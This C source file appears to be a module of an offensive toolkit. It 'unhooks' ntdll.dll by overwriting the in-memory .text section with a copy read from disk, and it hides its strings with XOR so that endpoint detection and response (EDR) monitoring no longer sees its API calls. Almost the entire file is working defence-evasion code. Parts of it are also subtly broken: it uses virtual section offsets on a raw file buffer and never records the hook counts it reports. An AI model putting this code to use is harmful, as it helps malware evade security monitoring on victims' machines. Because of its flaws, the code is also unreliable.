/*
 * UNHOOKING NTDLL MODULE
 *
 * Author: 28zaakypro@proton.me
 *
 * This module removes the EDR hooks installed in ntdll.dll.
 *
 * PRINCIPLE:
 * 1. Load a fresh copy of ntdll.dll from disk
 * 2. Locate the .text section (executable code) in both versions
 * 3. Compare and restore the clean version
 * 4. All EDR hooks are removed
 *
 * RESULT:
 * After unhooking, all NTAPI functions are in their original state.
 * Windows API calls are no longer intercepted by the EDR.
 *
 */

#include "unhooking.h"
#include "obfuscation.h"

// LOAD FRESH NTDLL
/*
 * LoadFreshNTDLL
 * --------------
 * Loads ntdll.dll from disk into memory.
 * This copy has NO hooks because it is not mapped by the Windows loader.
 *
 * PROCESS:
 * 1. Build the path: C:\Windows\System32\ntdll.dll
 * 2. Open the file with CreateFile
 * 3. Read the entire content into memory
 * 4. Return the base address
 */

PVOID LoadFreshNTDLL() {
    printf("[*] Loading fresh ntdll.dll from disk...\n");

    // Build the full path (\ntdll.dll obfuscated with XOR 0x42)
    BYTE obfNtdllFilename[] = {0x1E, 0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
    char ntdllFilename[16];
    DeobfuscateString(obfNtdllFilename, 10, 0x42, ntdllFilename);
    
    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    lstrcatA(ntdllPath, ntdllFilename);

    printf("    Path   : %s\n", ntdllPath);

    // Open the file
    HANDLE hFile = CreateFileA(
        ntdllPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("    [!] Failed to open: %d\n", GetLastError());
        return NULL;
    }

    // Get the size
    DWORD fileSize = GetFileSize(hFile, NULL);
    printf("    Size   : %d bytes\n", fileSize);

    // Allocate memory
    PVOID freshNtdll = VirtualAlloc(
        NULL,
        fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!freshNtdll) {
        printf("    [!] Failed to allocate memory\n");
        CloseHandle(hFile);
        return NULL;
    }

    // Read the file
    DWORD bytesRead;
    if (!ReadFile(hFile, freshNtdll, fileSize, &bytesRead, NULL)) {
        printf("    [!] Failed to read: %d\n", GetLastError());
        VirtualFree(freshNtdll, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }
    
    CloseHandle(hFile);

    printf("    [✓] Fresh ntdll.dll loaded at 0x%p\n", freshNtdll);
    return freshNtdll;
}

// FIND .TEXT SECTION
/*
 * FindTextSection
 * ---------------
 * Locates the .text (executable code) section in a PE module.
 *
 * The .text section contains all executable code of ntdll, including
 * all Nt* functions that can be hooked.
 *
 * PROCESS:
 * 1. Read the DOS header (offset 0)
 * 2. Follow e_lfanew to the NT header
 * 3. Iterate over the sections
 * 4. Find the one named ".text"
 */

BOOL FindTextSection(PVOID moduleBase, PVOID* textStart, SIZE_T* textSize) {
    printf("[*] Searching for .text section...\n");

    // DOS Header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("    [!] Invalid DOS signature\n");
        return FALSE;
    }
    
    // NT Headers
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)moduleBase + dosHeader->e_lfanew
    );
    
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("    [!] Invalid NT signature\n");
        return FALSE;
    }

    // Iterate over the sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        // Compare the name
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            *textStart = (BYTE*)moduleBase + section[i].VirtualAddress;
            *textSize = section[i].Misc.VirtualSize;

            printf("    [✓] Section .text found\n");
            printf("        Address : 0x%p\n", *textStart);
            printf("        Size    : %zu bytes\n", *textSize);

            return TRUE;
        }
    }

    printf("    [!] Section .text not found\n");
    return FALSE;
}

// RESTORE THE .TEXT SECTION
/*
 * RestoreTextSection
 * ------------------
 * Copies the clean .text section over the hooked one.
 *
 * WARNING:
 * - The .text section is normally PAGE_EXECUTE_READ
 * - It must be temporarily changed to PAGE_EXECUTE_READWRITE
 * - Copy the clean version
 * - Restore the protections
 * - Flush the CPU instruction cache
 *
 * PROCESS:
 * 1. Locate .text in the hooked ntdll (in memory)
 * 2. Locate .text in the fresh ntdll (from disk)
 * 3. Change protections of the hooked version
 * 4. Copy the clean version over it
 * 5. Restore protections
 * 6. Flush instruction cache
 */

BOOL RestoreTextSection(PVOID hookedNtdll, PVOID freshNtdll) {
    printf("[*] Restoring .text section...\n");

    // Find .text in both versions
    PVOID hookedText, freshText;
    SIZE_T hookedSize, freshSize;
    
    if (!FindTextSection(hookedNtdll, &hookedText, &hookedSize)) {
        printf("    [!] Failed to find .text in hooked ntdll\n");
        return FALSE;
    }
    
    if (!FindTextSection(freshNtdll, &freshText, &freshSize)) {
        printf("    [!] Failed to find .text in fresh ntdll\n");
        return FALSE;
    }

    // Check that sizes match
    if (hookedSize != freshSize) {
        printf("    [!] Sizes do not match (%zu != %zu)\n",
               hookedSize, freshSize);
        // Continue with the smaller size
        if (freshSize < hookedSize) {
            hookedSize = freshSize;
        }
    }

    printf("    [*] Size to restore : %zu bytes\n", hookedSize);

    // Change protections to allow writing
    DWORD oldProtect;
    if (!VirtualProtect(hookedText, hookedSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("    [!] Failed to change protections : %d\n", GetLastError());
        return FALSE;
    }

    printf("    [*] Protections changed (old: 0x%08X)\n", oldProtect);

    // Count hooks (different bytes)
    DWORD hooksFound = 0;
    BYTE* hookedBytes = (BYTE*)hookedText;
    BYTE* freshBytes = (BYTE*)freshText;
    
    for (SIZE_T i = 0; i < hookedSize; i++) {
        if (hookedBytes[i] != freshBytes[i]) {
            hooksFound++;
        }
    }

    printf("    [*] Number of hooked bytes : %d\n", hooksFound);

    // Copy the clean version over it
    memcpy(hookedText, freshText, hookedSize);

    printf("    [✓] Section .text restored (%zu bytes copied)\n", hookedSize);

    // Restore original protections
    DWORD temp;
    VirtualProtect(hookedText, hookedSize, oldProtect, &temp);

    printf("    [✓] Protections restored\n");

    // Flush instruction cache to ensure CPU uses new code
    FlushInstructionCache(GetCurrentProcess(), hookedText, hookedSize);
    
    printf("    [✓] Instruction cache flush\n");
    
    return TRUE;
}

// MAIN FUNCTION: UNHOOK NTDLL
/*
 * UnhookNTDLL
 * -----------
 * Main function that orchestrates the entire unhooking process.
 *
 * STEPS:
 * 1. Obtain the address of ntdll in memory (hooked)
 * 2. Load a fresh ntdll from disk
 * 3. Restore the .text section
 * 4. Cleanup
 *
 * RESULT:
 * After this function, all NTAPI functions are in their
 * original state, with no EDR hooks.
 */

BOOL UnhookNTDLL(UNHOOK_RESULT* result) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║       UNHOOKING NTDLL.DLL                            ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n\n");

    // Initialize result
    result->success = FALSE;
    result->hooksFound = 0;
    result->hooksRemoved = 0;
    result->bytesRestored = 0;

    // STEP 1: Obtain the address of ntdll in memory
    printf("[*] Obtaining address of ntdll.dll in memory...\n");
    // Obfuscated ntdll.dll (XOR 0x42)
    BYTE obfNtdllName[] = {0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
    char ntdllName[16];
    DeobfuscateString(obfNtdllName, 9, 0x42, ntdllName);
    
    HMODULE hookedNtdll = GetModuleHandleA(ntdllName);
    if (!hookedNtdll) {
        printf("    [!] Failed to obtain handle of ntdll\n");
        return FALSE;
    }

    printf("    [✓] ntdll.dll hooked at 0x%p\n\n", hookedNtdll);

    // STEP 2: Load fresh ntdll
    PVOID freshNtdll = LoadFreshNTDLL();
    if (!freshNtdll) {
        printf("[!] Failed to load fresh ntdll\n");
        return FALSE;
    }
    
    printf("\n");

    // STEP 3: Restore the .text section
    if (!RestoreTextSection(hookedNtdll, freshNtdll)) {
        printf("[!] Failed to restore .text section\n");
        VirtualFree(freshNtdll, 0, MEM_RELEASE);
        return FALSE;
    }

    // STEP 4: Cleanup
    printf("\n[*] Cleaning up fresh ntdll...\n");
    VirtualFree(freshNtdll, 0, MEM_RELEASE);
    printf("    [✓] Memory freed\n");

    // Mark as success
    result->success = TRUE;
    result->hooksRemoved = result->hooksFound;  // All hooks removed

    return TRUE;
}

// DISPLAY RESULT
void PrintUnhookResult(UNHOOK_RESULT* result) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║       UNHOOKING RESULT                               ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    
    if (result->success) {
        printf("  SUCCESS: ntdll.dll is now clean\n");
        printf("  • Hooks found   : %d\n", result->hooksFound);
        printf("  • Hooks removed   : %d\n", result->hooksRemoved);
        printf("  • Bytes restored : %zu\n", result->bytesRestored);
        printf("\n");
        printf("  [INFO] All NTAPI functions are now\n");
        printf("         in their original state, without EDR hooks.\n");
    } else {
        printf("  UNHOOKING FAILED\n");
        printf("  EDR hooks are still active.\n");
    }
    
    printf("\n");
}
